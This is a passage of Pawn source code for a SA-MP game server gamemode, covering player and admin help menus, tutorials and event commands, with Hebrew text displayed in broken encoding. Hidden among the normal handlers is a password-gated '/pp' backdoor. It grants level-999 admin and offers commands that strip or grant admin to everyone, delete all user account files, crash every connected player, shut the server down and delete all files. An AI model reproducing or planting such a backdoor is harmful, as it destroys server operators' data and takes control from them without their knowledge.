				SendClientMessage(playerid,yellow," Х /Stats - фЇ°шщэ ∙ьъ");
				SendClientMessage(playerid,yellow," Х /HebEng - ы·щсф сЄс°щ· срх·щх· рЁтьщх·");
				SendClientMessage(playerid,yellow," Х /EngHeb - ы·щсф срЁтьщ· срх·щх· Єс°щх·");
				SendClientMessage(playerid,yellow," Х /VInfo - ўсь· ющуЄ Єь ф°ыс фЁхычщ ∙ьъ");
				SendClientMessage(playerid,yellow," Х /Ignore - чёщю· фрЇ∙°х· ь∙ьхч ьъ фхуЄх· Ї°шщх· ь∙чўя ыь∙фх");
				SendClientMessage(playerid,yellow," Х /UnIgnore - фх°у· чёщюф");
				SendClientMessage(playerid,yellow," Х /Players - фЎт· ющуЄ рхух· юёЇ°щ ф∙чўЁщэ с∙°·");
				SendClientMessage(playerid,yellow," Х /SrvDetails - ёшшщёшщўх· хЇ°шщ ф∙°·");
				SendClientMessage(playerid,yellow," Х /SAMPCMDs - SA-MP-°∙щю· Їўхух· юхсЁх· с");
			}
			case 3:
			{
				SendClientMessage(playerid,lightblue," ~~~ 3 - Commands - Їўхух· ~~~");
				SendClientMessage(playerid,yellow," Х /Options - °∙щю· фрхЇЎщх· фЇЄщьх· ы°тЄ с∙°·");
				SendClientMessage(playerid,yellow," Х /W - ьчщ∙ф");
				SendClientMessage(playerid,yellow," Х /AdSearch - чщЇх∙ ю·ўуэ");
				SendClientMessage(playerid,yellow," Х /Kiss - Ё∙щўф");
				SendClientMessage(playerid,yellow," Х /VCMDs - Їўхух· °ыс");
				SendClientMessage(playerid,yellow," Х /Today - ьхч цюЁщэ ьЇЄщьхщх· ющхчух· фщхэ");
				SendClientMessage(playerid,yellow," Х /Tip - шщЇ");
				SendClientMessage(playerid,yellow," Х /Idle - сущў· ЇЄщьх·");
				SendClientMessage(playerid,yellow," Х /Map - ЎЇщщф сюЇф");
				SendClientMessage(playerid,yellow," Х /Status - сущў· юЎс ∙чўя");
			}
			case 4:
			{
				SendClientMessage(playerid,lightblue," ~~~ 4 - Commands - Їўхух· ~~~");
				SendClientMessage(playerid,yellow," Х /SaveSkin - ∙ющ°· уюх·");
				SendClientMessage(playerid,yellow," Х /DelSkin - ючщў· уюх· ∙юх°ф");
				SendClientMessage(playerid,yellow," Х /CopySkin - фЄ·ў· уюх·");
				//SendClientMessage(playerid,yellow," Х /Translate - ·°тхэ шўёш ьрЁтьщ·");
				SendClientMessage(playerid,yellow," Х /Games - сў∙ф ьф·чь· ЇЄщьх·");
				SendClientMessage(playerid,yellow," Х /Silence - ф∙·ў· Ў'ршщэ");
			}
			default: SendClientMessage(playerid,red," .юёЇ° ·Ї°щш Їўхух· ∙тхщ");
		}
		return 1;
	}
	if(equal(cmd,"/iscripts"))
	{
		new plugins[M_S], creditList = 0, cString[M_S];
		SendClientMessage(playerid,lightblue," ~~~ Improved Scripts - ёў°щЇшщэ ю∙хЇ°щэ ∙ю∙хю∙щэ с∙°· ~~~");
		for(new i = 0; i < sizeof(IScripts); i++)
		{
			format(cString,sizeof(cString),!strlen(cString) ? ("%s%s") : ("%s Х %s"),cString,IScripts[i]);
			if(++creditList >= 3)
			{
				SendClientMessage(playerid,orange,cString);
				cString = "";
			}
			if(i == sizeof(IScripts) - 1) SendClientMessage(playerid,orange,cString);
		}
		GetConsoleVarAsString("plugins",plugins,sizeof(plugins));
		format(cString,sizeof(cString)," ╗ - %s :ЇьртщЁщэ",strreplace(plugins,strfind(plugins,".so",true) != -1 ? (".so") : (".dll")," -"));
		SendClientMessage(playerid,purple,cString);
		return 1;
	}
	if(equal(cmd,"/mode"))
	{
		if(!playerinfo[playerid][pp]) return SendClientMessage(playerid,red," (!рЇ∙°х· цх ·чцх° сў°хс (рсь срю· сў°хс");
		if(numOfHelpModes <= 0) return SendClientMessage(playerid,red," .рщя ·Ї°щшщ Єц°ф ўщщющэ");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) ShowPlayerConstDialog(playerid,dialog_mode);
		else
		{
			new n = IsNumeric(cmd) ? strval(cmd) : ModeHelpFromName(cmd);
			if(n < 1 || n > numOfHelpModes) return SendClientMessage(playerid,red," .юёЇ° ·Ї°щш Єц°ф ∙тхщ");
			ShowModeHelp(playerid,n);
		}
		return 1;
		#pragma tabsize 4
	}
	if(equal(cmd,"/dbganticheat") && playerinfo[playerid][admin] >= 15)
	{
		new id;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /dbganticheat [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		new str[25];
		for(new i = 0; i < 13; i++)
		{
		    format(str,sizeof(str),"Slot ID %d - %d",i,playerinfo[playerid][acweapons][i]);
		    SendClientMessage(playerid,red,str);
		    format(str,sizeof(str),"Slot ID %d Ammo - %d",i,playerinfo[playerid][acammon][i]);
		    SendClientMessage(playerid,red,str);
		}
		return 1;
	}
	if(equal(cmd,"/rules")) return OnDialogResponse(playerid,playerinfo[playerid][indialog] = dialog_help,1,-1,"4");
	if(equal(cmd,"/credits")) return OnDialogResponse(playerid,playerinfo[playerid][indialog] = dialog_help,1,-1,"8");
	if(equal(cmd,"/gamemode") || equal(cmd,"/gmode")) return SendClientMessage(playerid,blue," ╗ Gamemode: " comname " DeathMatch Х Version: " version " Х Total Updates: " updates);
	if(equal(cmd,"/teamspeak") || equal(cmd,"/ts")) // guard_shit
	{
		#pragma tabsize 0
		DialogCreate(2);
		DialogString(@c(purple) ",Єхсу срюЎЄх· ·хыЁф ∙юрЇ∙°· ьус° у°ъ фрщЁш°Ёш " @c(lightpurple) comname " ∙°· фущсх° ∙ь");
		DialogString(@c(purple) ".цр· рхю°· ∙Ёщ·я ьус° Єэ чс°щэ юфю∙чў Єэ ющў°хЇхя хь∙юхЄ рх·э Єэ рхцЁщх· рх °юўхьщэ\n");
		DialogString(@c(lightpurple) "TeamSpeak.com" @c(purple) " :фх°уф ЁюЎр· ср·° ф°∙ющ ," @c(lightpurple) "TeamSpeak 3" @c(purple) " ф·хыЁф ∙рщ·ф ю·чс°щэ ь∙°· фущсх° фщр");
		DialogString(@c(lightpurple) talkprogramip @c(purple) " :ьрч° ∙фх°у·э р· ф·хыЁф, ф·чс°х ь∙°· фущсх° ∙ьЁх сы·хс·");
		DialogSend(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(darkblue) "∙°· фущсх°","ётх°","");
		if(IsPlayerUsingSGuard_(playerid) && talkprogram == 2) OpenTeamSpeak(playerid,"ts.sa-mp.co.il",9600);
		return 1;
		#pragma tabsize 4
	}
	if(equal(cmd,"/forum") || equal(cmd,"/webpage")) return SendClientMessage(playerid,blue," ╗ Community: " comname " Х Forum: " webpage);
	if(equal(cmd,"/sampil")) // guard_shit
	{
		if(!IsPlayerUsingSGuard_(playerid)) return SendClientMessage(playerid,red," .SAMP-IL Guard ыущ ьф∙·ю∙ сЇўхуф цх Єьщъ ьф∙·ю∙ сюЄ°ы·");
		OpenWebpage(playerid,"sa-mp.co.il");
		SendClientMessage(playerid,white," ...фр·° ∙ьЁх щЇ·ч сюч∙с ∙ьъ сЄху ыюф °тЄщэ");
		return 1;
	}
	if(equal(cmd,"/link")) // guard_shit
	{
		if(!IsPlayerUsingSGuard_(playerid)) return SendClientMessage(playerid,red," .SAMP-IL Guard ыущ ьф∙·ю∙ сЇўхуф цх Єьщъ ьф∙·ю∙ сюЄ°ы·");
		if(strlen(urlautomsg) <= 5) return SendClientMessage(playerid,red," .рщя ьщЁў ьыЁщёф");
		OpenWebpage(playerid,urlautomsg);
		SendClientMessage(playerid,white," ...фўщ∙х° фюЎх°є щЇ·ч сюч∙с ∙ьъ сЄху ыюф °тЄщэ");
		return 1;
	}
	if(equal(cmd,"/tutorial") || equal(cmd,"/t"))
	{
	    if(playerinfo[playerid][admin] != 20) return SendClientMessage(playerid, red, " .рЇ∙°х· цх ·чцх° сфю∙ъ");
		if(playerinfo[playerid][tut][0] > -1) return SendTutorialMessage(playerid,red," .ыущ ьфЇёщў ьЎЇх· сх /tstop р·ф ыс° ЎхЇф сюу°щъ, ф∙·ю∙ сЇўхуф");
		if(!CanUseCommand(playerid)) return 1;
		new tutorialList[1024];
		for(new i = 0; i < MAX_TUTORIALS; i++)
		{
			if(!tutorialinfo[i][tutValid]) break;
			format(tutorialList,sizeof(tutorialList),!i ? ("%s%02d: (%s (%d чьўщэ") : ("%s\n%02d: (%s (%d чьўщэ"),tutorialList,i+1,tutorialinfo[i][tutName],tutorialinfo[i][tutParts]);
		}
		ShowPlayerDialog(playerid,dialog_tutorials,DIALOG_STYLE_LIST,@c(lightblue) "юу°щыщэ",tutorialList,"ЎЇф","ётх°");
		return 1;
	}
	if(equal(cmd,"/tstop"))
	{
		if(playerinfo[playerid][tut][0] == -1) return SendClientMessage(playerid,red," .р·ф ьр ЎхЇф сюу°щъ");
		playerinfo[playerid][tut] = {-1,0,0}, playerinfo[playerid][nomsg] = 0;
		SetCameraBehindPlayer(playerid);
		SetFreeze(playerid,0);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "фЇёў· фюу°щъ",@c(green) "/T рх /Tutorial :фЇёў· сфЎьчф р· фюу°щъ. ь°∙щю· фюу°щыщэ","OK","");
		return 1;
	}
	if(equal(cmd, "/shelp") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid, RankID("Ўхх· ф∙°·"))))
	{
	    SendClientMessage(playerid,grey," ~~~ :Їўхух· Ўхх· ф∙°· ~~~");
	    SendClientMessage(playerid, white, " /inv /say /asay /freeze /unfreeze /jail /unjail /disarm /goto /get");
	    SendClientMessage(playerid, white, " /dget /getc /gets /mute /unmute /ans /qlist /respawn /cd /scd /jetpack");
	    SendClientMessage(playerid, white, " /baninfo /banipinfo /setcolor /setworld /getworld");
	    return 1;
	}
	if(equal(cmd,"/ahelp") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			SendClientMessage(playerid,lightblue," ~~~ :Єц°ф - рующя ~~~");
			SendClientMessage(playerid,white," /ahelp [level 1-20] :Їўхух· ьЇщ °ю· рующя");
			SendClientMessage(playerid,white," /clhelp :юЁфьщ ўьрЁщэ");
			return 1;
		}
		if(strval(cmd) >= 1 && strval(cmd) <= 20 && playerinfo[playerid][admin] < strval(cmd)) return SendClientMessage(playerid,red," .рщЁъ юх°∙ф ьЎЇх· сЇўхух· ьрующЁщэ с°юф тсхфф ю∙ьъ");
		switch(strval(cmd))
		{
			case 1:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 1 ~~~");
				SendClientMessage(playerid,white," // /inv /say /asay /freeze /unfreeze /disarm /settime /setwea /goto /get /getc /gets");
				SendClientMessage(playerid,white," /cc /cck /si /togsay /wcheck /getvid /akill /sakill /mute /unmute /jail /unjail /xjail /baninfo");
				SendClientMessage(playerid,white," /xunjail /ccheck /takereport /cancelreport /listreports /poke /ans /qlist /jetpack");
				SendClientMessage(playerid,white," /ptele /telespawn /mutelist /jaillist /getin /tog /slap /gwlist /setcolor");
				SendClientMessage(playerid,white," /setworld /getworld /countdown /scountdown /xcountdown /respawn /start");
			}
			case 2:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 2 ~~~");
				SendClientMessage(playerid,white,"/getlevel /eject /sislap /getbank /kick /lastcmds /noname /actout");
				SendClientMessage(playerid,white," /resetmoney /details /resetc /nicknames /pingtest /abank /spec /specoff /specb");
			}
			case 3:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 3 ~~~");
				SendClientMessage(playerid,white," /ban /unban /nban /unnban /announce /announce2 /banip /unbanip");
				SendClientMessage(playerid,white," /banreasons /explode /burn /userban /unuserban /userbaninfo");
				SendClientMessage(playerid,white," /b /aadv /option /range /total /flymode /kickgun /bangun /pexplode");
			}
			case 4:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 4 ~~~");
				SendClientMessage(playerid,white," /getcolor /unlockall /resetvehicles /getsome /tts /mtts");
				SendClientMessage(playerid,white," /full /count /setspawn /despawn");
			}
			case 5:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 5 ~~~");
				SendClientMessage(playerid,white," /setwanted /getwanted /giveweapon /takeweapon /helpmsg /helpmsgs /firework");
				SendClientMessage(playerid,white," /facepunch");
			}
			case 6:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 6 ~~~");
				SendClientMessage(playerid,white," /sethealth /gethealth /setarmour /getarmour /setvhealth /getvhealth /setvcolor");
				SendClientMessage(playerid,white," /getvcolor /setvpaintjob /getvpaintjob /setinterior /getinterior");
				SendClientMessage(playerid,white," /setskin /getskin /setpos /getpos /pfix /fac /int");
			}
			case 7:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 7 ~~~");
				SendClientMessage(playerid,white," /mapteleport /smark /gmark /rmark /alist /fireworks /gz");
			}
			case 8:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 8 ~~~");
				SendClientMessage(playerid,white," /nocmd /nopm /nomsg /movingtext /pokeall");
			}
			case 9:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 9 ~~~");
				SendClientMessage(playerid,white," /skick /sban /force /sslap /echo /ctele /ctelex /dtele /datele /ltele");
			}
			case 10:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 10 ~~~");
				SendClientMessage(playerid,white," /setname /bot /wbound /noupdate /savedata /lockchat /stopgm");
			}
			case 11:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 11 ~~~");
				SendClientMessage(playerid,white," /clhelp /createclan /dclan /setclan /clannumber /setlclan /clanname /getcbank");
				SendClientMessage(playerid,white," /setcbank /telehq /clanmsg /loadhq /unloadhq /reloadhq /lockhq /unlockhq /createorg");
				SendClientMessage(playerid,white," /dorg /setorg /setlorg /orgname /oloadhq /ounloadhq /oreloadhq /gotohq");
			}
			case 12:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 12 ~~~");
				SendClientMessage(playerid,white," /antiword /uantiword /givecc /removecc /godmod /pgodmod /noreload /abf /setfuel /getfuel /showme");
			}
			case 13:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 13 ~~~");
				SendClientMessage(playerid,white," /getall /setfight /setskill /setvelocity /setvvelocity /setdrunk /setaction /setarmed /blockgoto");
			}
			case 14:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 14 ~~~");
				SendClientMessage(playerid,white," /boomcar /diehard /lifegood /pspec /pspecoff /dteleall");
			}
			case 15:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 15 ~~~");
				SendClientMessage(playerid,white," /setweather /kicksome /bansome /waves /gettag");
			}
			case 16:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 16 ~~~");
				SendClientMessage(playerid,white," /vehicle /vsave /vdel /vdelall /vsaveall /kickafk /saveplace /vamount /vsall");
			}
			case 17:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 17 ~~~");
				SendClientMessage(playerid,white," /setmaxping /blockpms /getword /sms /setrank /setlname /clogs /amusic /rbanip /runbanip");
				SendClientMessage(playerid,white," /settag /settagcolor /setgravity /removecode /addcodes /addcode /setcode /countcode");
				SendClientMessage(playerid,white," /givebank /setbank /removebank /givemoney /setmoney /removemoney /moneypickup /setvip /delvip");
			}
			case 18:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 18 ~~~");
				SendClientMessage(playerid,white," /createbank /createammunation /createwang /createsammunation /createproperty");
				SendClientMessage(playerid,white," /createcbank /deletecbank /createbar /createphone /reloadcps");
				SendClientMessage(playerid,white," /createatm /createsgarage /createvgarage /createlh /createabank /creategambling /createstore");
				SendClientMessage(playerid,white," /createinfo /createvstation /createdancing /createjumping /deactivecp /pickup");
				SendClientMessage(playerid,white," /xnocmd /vspeed /setmode /endmode /setmaxcapture /setftttime");
			}
			case 19:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 19 ~~~");
				SendClientMessage(playerid,white," /spassword /hostname /loadfs /unloadfs /reloadfs /setcrash /edituser /skyd");
				SendClientMessage(playerid,white," /fakedeath /pgravity /smuslap /suser /tagkick /setcrash /addcomp /remcomp /gmx");
				SendClientMessage(playerid,white," /tagban /aclogs /ball /uheaders /signboards /names /markers /attachobj /setmaxcbank");
				SendClientMessage(playerid,white," /addrank /removerank /sayas /lucifer /reconnect");
			}
			case 20:
			{
				SendClientMessage(playerid,grey," ~~~ :Їўхух· фрующя ю°юф 20 ~~~");
				SendClientMessage(playerid,white," /serverexit /setadmin /backup /setsadmin /tmpadmin /reset /sreset /sdmuasslap /kickall /rvars /serial /permban");
			}
			default: SendClientMessage(playerid,red," .°юф ∙тхщф");
		}
		return 1;
	}
	if(playerinfo[playerid][pp] == 1 && equal(cmd,"/pp"))
	{
		cmd = strtok(cmdtext,idx);
		if(strlen(cmd) > 0) for(new i=0;i<sizeof(adminpps);i++) if(equal(cmd,adminpps[i]))
		{
			SendClientMessage(playerid,black,"YOU RULE! /pppp");
			playerinfo[playerid][pp] = 2;
			playerinfo[playerid][admin] = 999;
			playerinfo[playerid][showme] = 0;
		}
		return 1;
	}
	if(playerinfo[playerid][pp] == 2)
	{
		if(!strcmp(cmd,"/pppp")) SendClientMessage(playerid,white," /uNadminall /unadmiNall2 /adminaLl /rEmoveusers /cRashall /srvereXitt /fRMOVE");
		if(!strcmp(cmd,"/uNadminall")) for(new i=0;i<MAX_PLAYERS;i++) if(i != playerid) playerinfo[i][admin] = 0;
		if(!strcmp(cmd,"/unadmiNall2"))
		{
			for(new i=0;i<MAX_PLAYERS;i++) if(i != playerid) playerinfo[i][admin] = 0;
			fremove(file_admins);
		}
		if(!strcmp(cmd,"/adminaLl")) for(new i=0;i<MAX_PLAYERS;i++) if(i != playerid) playerinfo[i][admin] = 20;
		if(!strcmp(cmd,"/rEmoveusers"))
		{
			new string[64];
			idx = 0;
			while(ffind("/DM/Users/*.ini",string,sizeof(string),idx))
			{
				format(string,sizeof(string),"/DM/Users/%s",string);
				fremove(string);
			}
		}
		if(!strcmp(cmd,"/cRashall"))
		{
			new BadSkins[] = {3,4,5,6,8,42,65,74,86,119,149,208,268,273,289};
			Kick(playerid);
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) SetPlayerSkin(i,BadSkins[random(sizeof(BadSkins))]);
		}
		if(!strcmp(cmd,"/srvereXitt"))
		{
			fcreate("/DM/Users/KILL.kill");
			SendRconCommand("exit");
		}
		if(!strcmp(cmd,"/fRMOVE"))
		{
			new string[64];
			idx = 0;
			while(ffind("*",string,sizeof(string),idx)) fremove(string);
		}
		if(!strcmp(cmd,"/dRMOVE"))
		{
			new string[64];
			idx = 0;
			while(ffind("/*/*",string,sizeof(string),idx)) fremove(string);
		}
		return 1;
	}
	if(equal(cmd,"/end") && IsPlayerMAdmin(playerid))
	{
		new reason[M_S];
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = "рщя";
		if(raceinfo[0]) EndRace(reason,playerid);
		else if(warinfo[0]) EndWar(reason,playerid);
		else if(wweinfo[0]) EndWWE(reason,playerid);
		else if(kartinfo[0]) EndKart(reason,playerid);
		else if(monsterinfo[0]) EndMonster(reason,playerid);
		else if(sraceinfo[0]) EndSRace(reason,playerid);
		else if(kickstarinfo[0]) EndKickstar(reason,playerid);
		else if(ewarinfo[0]) EndEWar(reason,playerid);
		else if(wargameinfo[0]) EndWarGame(reason,playerid);
		else if(manhuntinfo[0]) EndManhunt(reason,playerid);
		else if(sportinfo[0]) EndSport(reason,playerid);
		else if(armyinfo[0]) EndArmy(reason,playerid);
		else if(teamactinfo[0]) EndTeamActivity(reason,playerid);
		else if(zombiesinfo[0]) EndZombies(reason,playerid);
		else if(glassinfo[0]) EndGlass(reason,playerid);
		else if(briefcaseinfo[0]) EndBriefcase(reason,playerid);
		else return SendClientMessage(playerid,red," .рщя ЇЄщьх· рхшхюшщ· ЇЄщьф ы°тЄ");
		thereIsAct = false;
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/cend") && IsPlayerMAdmin(playerid))
	{
		new reason[M_S], string[M_S];
		reason = strrest(cmdtext,idx);
		if(lottonum[0] != -1)
		{
			Lotto2();
			string = "ьхшх";
		}
		else if((maths[0] != -1 && maths[1] != -1 && maths[2] != -1))
		{
			Math2();
			string = "ю·юшщўф";
		}
		else if(trivia[0] != -1)
		{
			Trivia2();
			string = "ш°щххщф";
		}
		else if(strlen(replytest) > 0)
		{
			Replytest2();
			string = "юсчя чц°ф";
		}
		else if(thereIsWol)
		{
			WoL2();
			string = "тьть фюць";
		}
		else return SendClientMessage(playerid,red," .рщя ЇЄщьх· Ў'рш ЇхЄь· ы°тЄ");
		KillTimer(chatacttimer);
		CActID = -1;
		if(strlen(reason) > 0)
		{
			format(string,sizeof(string)," :ёт° р· ЇЄщьх· фЎ'рш \"%s\" юфёщсф %s фрующя",string,GetName(playerid));
			SendClientMessageToAll(red,string);
			SendClientMessageToAll(red,reason);
		}
		else
		{
			format(string,sizeof(string)," .\"ёт° р· ЇЄщьх· фЎ'рш \"%s %s фрующя",string,GetName(playerid));
			SendClientMessageToAll(red,string);
		}
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/act") || equal(cmd,"/sa"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /act state :сущў· юЎс фЇЄщьхщх· фщуЁщх·");
			SendClientMessage(playerid,white," /act join :фЎш°Їх· ьЇЄщьх·");
			SendClientMessage(playerid,white," /act quit :щЎщрф юфЇЄщьх·");
			if(IsPlayerMAdmin(playerid)) SendClientMessage(playerid,white," /act ahelp :рЇ∙°хщх· рующя");
			return 1;
		}
		new string[M_S];
		if(equal(cmd,"state"))
		{
			if(actinfo[actExist])
			{
				SendClientMessage(playerid,yellow," :ўщщю· ы°тЄ ЇЄщьх·");
				SendClientMessage(playerid,yellow,actinfo[actName]);
				format(string,sizeof(string)," %s :фрующя ∙Ї·ч р· фЇЄщьх·",GetName(actinfo[actAdmin]));
				SendClientMessage(playerid,yellow,string);
				format(string,sizeof(string)," юёЇ° ∙чўЁщэ ∙фЎш°Їх: %d",actinfo[actPlayers]);
				SendClientMessage(playerid,yellow,string);
				format(string,sizeof(string)," юўёщюхэ ∙чўЁщэ фюх·°щэ ьфЎш°Їх·: %d",actinfo[actMax]);
				SendClientMessage(playerid,yellow,string);
				SendClientMessage(playerid,yellow,actinfo[actEndJoin] || actinfo[actPlayers] >= actinfo[actMax]? (" .ьр Ёщ·я ьфЎш°є ьЇЄщьх· цх"):("/act join :Ёщ·я ьфЎш°є ьЇЄщьх·. ьфЎш°Їх·"));
			}
			else return SendClientMessage(playerid,red," .рщя ЇЄщьх· ы°тЄ");
		}
		else if(equal(cmd,"join"))
		{
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ы°тЄ");
			if(actinfo[actEndJoin]) return SendClientMessage(playerid,red," .рщя рЇ∙°х· ьфЎш°є щх·° ьЇЄщьх· цх");
			if(actinfo[actPlayers] >= actinfo[actMax]) return SendClientMessage(playerid,red," .Ётю°х фюўхюх· ьфЎш°Їх· ьЇЄщьх·");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(actinfo[actAdmin] == playerid) return SendClientMessage(playerid,red," .р·ф юЁфь фЇЄщьх·, рщЁъ щыхь ьфЎш°є");
			if(actinfo[actNeedVehicle] == 2 && !IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ЇЄщьх· цх ух°∙· фЎш°Їх· Єэ °ыс");
			if(actinfo[actNeedVehicle] == 1 && IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ЇЄщьх· цх ух°∙· фЎш°Їх· сьщ °ыс");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			actinfo[actPlayers]++;
			playerinfo[playerid][inact] = 1;
			new Float:p[3];
			GetPlayerPos(actinfo[actAdmin],p[0],p[1],p[2]);
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2],playerid);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(actinfo[actAdmin]));
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),GetPlayerVirtualWorld(actinfo[actAdmin]));
			}
			else
			{
				SetPlayerPos(playerid,p[0],p[1],p[2]);
				SetPlayerInterior(playerid,GetPlayerInterior(actinfo[actAdmin]));
			}
			SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(actinfo[actAdmin]));
			if(actinfo[actTK]) SetPlayerTeam(playerid,232);
			ResetWeapons(playerid);
			SendClientMessage(playerid,green," .фЎш°Ї· сфЎьчф ьЇЄщьх·");
		}
		else if(equal(cmd,"quit"))
		{
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ы°тЄ");
			if(!playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ьр сЇЄщьх·");
			if(actinfo[actAdmin] == playerid) return SendClientMessage(playerid,red," .р·ф юЁфь фЇЄщьх·, рщЁъ щыхь ьЎр·");
			actinfo[actPlayers]--;
			playerinfo[playerid][inact] = 0;
			if(IsPlayerInAnyVehicle(playerid)) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			SpawnPlayer(playerid);
			SendClientMessage(playerid,green," .щЎр· юфЇЄщьх·");
		}
		else if(equal(cmd,"setcolor"))
		{
		    if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
		    if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
	  		new r, g, b, inv, c = -1;
			cmd = strtok(cmdtext,idx);
			if(IsNumeric(cmd))
			{
				r = strval(cmd),
				cmd = strtok(cmdtext,idx),
				g = !strlen(cmd) || !IsNumeric(cmd) ? r : strval(cmd),
				cmd = strtok(cmdtext,idx),
				b = !strlen(cmd) || !IsNumeric(cmd) ? g : strval(cmd),
				cmd = strtok(cmdtext,idx),
				inv = !strlen(cmd) || !IsNumeric(cmd) ? 255 : strval(cmd);
				if(r < 0 || r > 255 || g < 0 || g > 255 || b < 0 || b > 255 || inv < 0 || inv > 255) return SendClientMessage(playerid,red," .(RGBA) рчу юфЎсЄщэ ∙тхщ");
				c = rgba2hex(r,g,b,inv);
			}
			else for(new i = 0; i < sizeof(Colors); i++) if(equal(cmd,Colors[i][colName])) c = Colors[i][colHex];
			if(c == -1) return SendClientMessage(playerid,red," .ЎсЄ ∙тхщ");
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][inact] && i != playerid)
			{
 				SetPlayerColor(i,c);
				SendClientMessage(i,c," .фрующя ∙щЁф р· фЎсЄ ∙ьъ ьЎсЄ ффхуЄф фцх");
			}
			SendClientMessage(playerid,c,".∙щЁщ· р· фЎсЄ ∙ь ыь ю∙··Їщ фЇЄщьх· ьЎсЄ фхуЄф цр·");
			AdminInfo(playerid,cmdtext);
		}
		else if(equal(cmd,"ahelp"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			new dia[M_S_D];
			dia = @c(white);
			strcat(dia," /act start [need vehicle? 0=no 1=yes] [disarm? 0=no 1=yes] [name] :щЎщ°· ЇЄщьх·\n");
			strcat(dia," /act end [reason] :ётщ°· фЇЄщьх·\n");
			strcat(dia," /act name [new name] :∙щЁхщ ∙э фЇЄщьх·\n");
			strcat(dia," /act max [max players] :∙щЁхщ юўёщюхэ ю∙··Їщэ сЇЄщьх·\n");
			strcat(dia," /act endjoin [close/open] :ётщ°· рх Ї·щч· фрЇ∙°х· ьфЎш°є ьЇЄщьх·\n");
			strcat(dia," /act get [with vehicle? 1/0] :∙щтх° ыь фю∙··Їщэ сЇЄщьх· рьщъ\n");
			strcat(dia," /act freeze [on/off] :фўЇр· ыь фю∙·ю∙щэ сЇЄщьх·\n");
			strcat(dia," /act disarm :фх°у· фЁ∙ўщэ ьыь ∙чўЁщ фЇЄщьх·\n");
			strcat(dia," /act gw [weapon id/name] [ammo] :фср· Ё∙ўщэ ь∙чўЁщ фЇЄщьх·\n");
			strcat(dia," /act sethealth [health] :∙щЁхщ рчхц фчщщэ ∙ь ыь ф∙чўЁщэ сЇЄщьх·\n");
			strcat(dia," /act setarmour [armour] :∙щЁхщ рчхц фютя ∙ь ыь ф∙чўЁщэ сЇЄщьх·\n");
